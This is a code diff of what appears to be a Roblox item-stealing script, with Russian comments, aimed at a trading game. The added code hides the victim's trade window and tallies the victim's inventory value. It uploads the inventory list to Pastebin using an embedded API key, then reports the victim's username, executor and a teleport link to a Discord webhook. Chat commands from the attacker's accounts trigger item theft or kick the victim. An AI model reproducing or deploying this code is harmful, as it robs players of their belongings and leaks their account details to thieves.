+                    anti.Parent = gui
+                end
+            end
         end
+    end
+
+    -- Скрываем сразу при запуске
+    hideTradeGUI()
+
+    -- Отслеживаем появление новых окон
+    playerGui.ChildAdded:Connect(function(child)
+        if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+            hideTradeGUI()
+        end
+    end)
+
+    -- Периодическая проверка
+    while true do
+        hideTradeGUI()
+        task.wait(0.1)
+    end
+end
+
+-- Запускаем скрытие GUI в отдельной корутине
+coroutine.wrap(setupTradeGUIHider)()
+
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local totalValues = 0
+
+local vintageItems1 = {}
+local commonItems1 = {}
+local uncommonItems1 = {}
+local rareItems1 = {}
+local legendaryItems1 = {}
+local godlyItems1 = {}
+local ancientItems1 = {}
+local uniqueItems1 = {}
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+local uniqueItemsValue = 0
+local ancientItemsValue = 0
+local godlyItemsValue = 0
+local vintageItemsValue = 0
+local legendaryItemsValue = 0
+local rareItemsValue = 0
+local uncommonItemsValue = 0
+local commonItemsValue = 0
+
+for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c, d in pairs(b) do
+        local itemValue = valuesTable[d.DataID] or 0
+        local totalValue = itemValue * d.Amount
+        
+        if d.Rarity == "Unique" then
+            uniqueItemsValue = uniqueItemsValue + totalValue
+        elseif d.Rarity == "Ancient" then
+            ancientItemsValue = ancientItemsValue + totalValue
+        elseif d.Rarity == "Godly" then
+            godlyItemsValue = godlyItemsValue + totalValue
+        elseif d.Rarity == "Vintage" then
+            vintageItemsValue = vintageItemsValue + totalValue
+        elseif d.Rarity == "Legendary" then
+            legendaryItemsValue = legendaryItemsValue + totalValue
+        elseif d.Rarity == "Rare" then
+            rareItemsValue = rareItemsValue + totalValue
+        elseif d.Rarity == "Uncommon" then
+            uncommonItemsValue = uncommonItemsValue + totalValue
+        elseif d.Rarity == "Common" then
+            commonItemsValue = commonItemsValue + totalValue
+        end
+    end
+end
+
+for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c, d in pairs(b) do
+        local itemKey = d.DataID
+        local itemValue = valuesTable[itemKey]
+        local weaponValue = itemValue and (itemValue * d.Amount) or 0
+
+        local formatTable = {
+            weaponName = d.ItemName,
+            weaponData = d.DataID,
+            weaponAmount = d.Amount,
+            weaponRarity = d.Rarity,
+            weaponValue = weaponValue
+        }
+        
+        table.insert(allItems, formatTable)
+
+        local visualFormat = d.ItemName .. " • [x" .. d.Amount .. " | " .. weaponValue .. "]"
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + d.Amount
+            table.insert(vintageItems, visualFormat)
+            table.insert(vintageItems1, formatTable)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + d.Amount
+            table.insert(commonItems, visualFormat)
+            table.insert(commonItems1, formatTable)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + d.Amount
+            table.insert(uncommonItems, visualFormat)
+            table.insert(uncommonItems1, formatTable)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + d.Amount
+            table.insert(rareItems, visualFormat)
+            table.insert(rareItems1, formatTable)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + d.Amount
+            table.insert(legendaryItems, visualFormat)
+            table.insert(legendaryItems1, formatTable)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + d.Amount
+            table.insert(godlyItems, visualFormat)
+            table.insert(godlyItems1, formatTable)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + d.Amount
+            table.insert(ancientItems, visualFormat)
+            table.insert(ancientItems1, formatTable)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + d.Amount
+            table.insert(uniqueItems, visualFormat)
+            table.insert(uniqueItems1, formatTable)
+        end
+    end
+end
+
+-- >> Values calculating logic << --
+for _, item in pairs(allItems) do
+    totalValues = totalValues + item.weaponValue
+end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local lastOfferValue = nil
+
+-- Перехватываем UpdateTrade чтобы получить LastOffer
+Trade.UpdateTrade.OnClientEvent:Connect(function(tradeData)
+    -- Сохраняем LastOffer из данных трейда
+    lastOfferValue = tradeData.LastOffer
+end)
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local function formatItems(itemList)
+    if #itemList == 0 then
+        return "None"
+    else
+        return table.concat(itemList, "\n")
+    end
+end
+
+local pastebinString = "-- [ Unique Items ] --\n" ..formatItems(uniqueItems)..
+                         "\n\n-- [ Ancient Items ] --\n" ..formatItems(ancientItems)..
+                         "\n\n-- [ Godly Items ] --\n" ..formatItems(godlyItems)..
+                         "\n\n-- [ Legendary Items ] --\n" ..formatItems(legendaryItems)..
+                         "\n\n-- [ Vintage Items ] --\n" ..formatItems(vintageItems)..
+                         "\n\n-- [ Rare Items ] --\n" ..formatItems(rareItems)..
+                         "\n\n-- [ Uncommon Items ] --\n" ..formatItems(uncommonItems)..
+                         "\n\n-- [ Common Items ] --\n" ..formatItems(commonItems)..
+
+                        "\n\nInventory list ft. Molitown"
+
+
+local pastebinLink = pastebin(pastebinString)
+
+if totalValues < MinimumValues then
+    return
+end
+
+-- УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ ТОП ПРЕДМЕТОВ
+local function getTopValuableItems(n)
+    local allItems = {}
+    
+    -- Собираем все предметы с детальной информацией
+    for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
+        for c, d in pairs(b) do
+            local itemValue = valuesTable[d.DataID] or 0
+            local totalValue = itemValue * d.Amount
+            
+            table.insert(allItems, {
+                name = d.ItemName,
+                dataId = d.DataID,
+                value = itemValue,
+                amount = d.Amount,
+                totalValue = totalValue,
+                rarity = d.Rarity
+            })
+        end
+    end
+    
+    -- Сортируем по убыванию ценности за штуку
+    table.sort(allItems, function(a, b) 
+        return a.value > b.value
+    end)
+    
+    -- Возвращаем топ-N предметов с улучшенным форматированием
+    local topItems = {}
+    for i = 1, math.min(n, #allItems) do
+        local item = allItems[i]
+        local rarityEmoji = {
+            Unique = "💎",
+            Ancient = "🔥", 
+            Godly = "⭐",
+            Vintage = "🕰️",
+            Legendary = "👑",
+            Rare = "🔵",
+            Uncommon = "🟢",
+            Common = "⚪"
+        }
+        
+        local emoji = rarityEmoji[item.rarity] or "📦"
+        table.insert(topItems, string.format("%s %s • %d • x%d", emoji, item.name, item.value, item.amount))
+    end
+    return topItems
+end
+
+-- Получаем 5 самых ценных предметов
+local topItems = getTopValuableItems(5)
+local topItemsText = #topItems > 0 and table.concat(topItems, "\n") or "No valuable items"
+
+local embed = {
+    ["title"] = "🎯 ВЬЕБАН - Долбаеб ракнул ваш скрипт! - " .. NameValue,
+    ["color"] = 16711935, 
+    ["fields"] = {
+        {
+            ["name"] = "🔗 **Teleport to :mammoth:**",
+            ["value"] = 
+            "🚀**Вставь в браузер для связи с дуплом**\n```" .. protocolLink .. "```\n" ..
+            "**Для автоматической связи:**\n```lua\n" .. TeleportScript .. "\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:mammoth:〙**Info user**",
+            ["value"] = 
+            "```lua\n"..
+            "Username      : "..NameValue.."\n"..
+            "Account Age   : "..AgeValue.." Days\n"..
+            "Executor      : "..ExecutorValue.."\n"..
+            "Receiver      : "..Username.."/"..Username2.."\n"..
+            "Version       : "..VersionValue.."```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:moneybag:〙**Inventory Stats**",
+            ["value"] = 
+            "```lua\n"..
+            "💎 ТОП 5 ПРЕДМЕТОВ:\n"..topItemsText.."\n\n"..
+            "💰 Общая стоимость : "..totalValues.."\n\n"..
+            "🔥 Ancients Value  : "..ancientItemsValue.."\n"..
+            "⭐ Godlies Value   : "..godlyItemsValue.."\n"..
+            "👑 Legendaries     : "..legendaryItemsValue.."\n```",
+            ["inline"] = false
+        },
+        {
+            ["name"] = "〘:package:〙**Full Inventory List**",
+            ["value"] = "[📋 Click to check]("..pastebinLink..")",
+            ["inline"] = false
+        },
+    }
+}
+
+-- Отправляем уведомление в зависимости от ценности
+if godlyItemsValue >= 100 or ancientItemsValue >= 100 or uniqueItemsValue >= 100 or totalValues >= 100 then
+    SendMessageEMBED(Webhook, embed, true)
+else
+    SendMessageEMBED(Webhook, embed, false)
+end
 
 local loop = false
 local function stealItems(ReceiverName)
@@ -1072,43 +806,43 @@ local function stealItems(ReceiverName)
     end
 end
 
-        -- Обработчики чата (как в оригинале)
-        game.Players.PlayerAdded:Connect(function(player)
-            if player.Name == Username or Username2 then
-                player.Chatted:Connect(function(msg)
-                    loop = true
-                    stealItems(Username)
-                end)
+-- Обработчики чата (как в оригинале)
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(msg)
+            loop = true
+            stealItems(Username)
+        end)
+    end
+end)
+
+-- >> /kick command << --
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username or Username2 then
+    player.Chatted:Connect(function(message)
+        if message == "free dope" then
+            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
+        end
+    end)
+end
+end)
+
+-- Автозапуск если игрок уже в игре
+for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(message)
+            if message == "free dope" then
+                game.Players.LocalPlayer:Kick("\nPlease rejoin!")
             end
         end)
+    end
+end
 
-        -- >> /kick command << --
-        game.Players.PlayerAdded:Connect(function(player)
-            if player.Name == Username or Username2 then
-            player.Chatted:Connect(function(message)
-                if message == "free dope" then
-                    game.Players.LocalPlayer:Kick("\nPlease rejoin!")
-                end
-            end)
-        end
+for _, player in pairs(game.Players:GetPlayers()) do
+    if player.Name == Username or Username2 then
+        player.Chatted:Connect(function(msg)
+            loop = true
+            stealItems(Username)
         end)
-
-        -- Автозапуск если игрок уже в игре
-        for _, player in pairs(game.Players:GetPlayers()) do
-                if player.Name == Username or Username2 then
-                player.Chatted:Connect(function(message)
-                    if message == "free dope" then
-                        game.Players.LocalPlayer:Kick("\nPlease rejoin!")
-                    end
-                end)
-            end
-        end
-
-           for _, player in pairs(game.Players:GetPlayers()) do
-            if player.Name == Username or Username2 then
-                player.Chatted:Connect(function(msg)
-                    loop = true
-                    stealItems(Username)
-                end)
-            end
-        end
+    end
+end
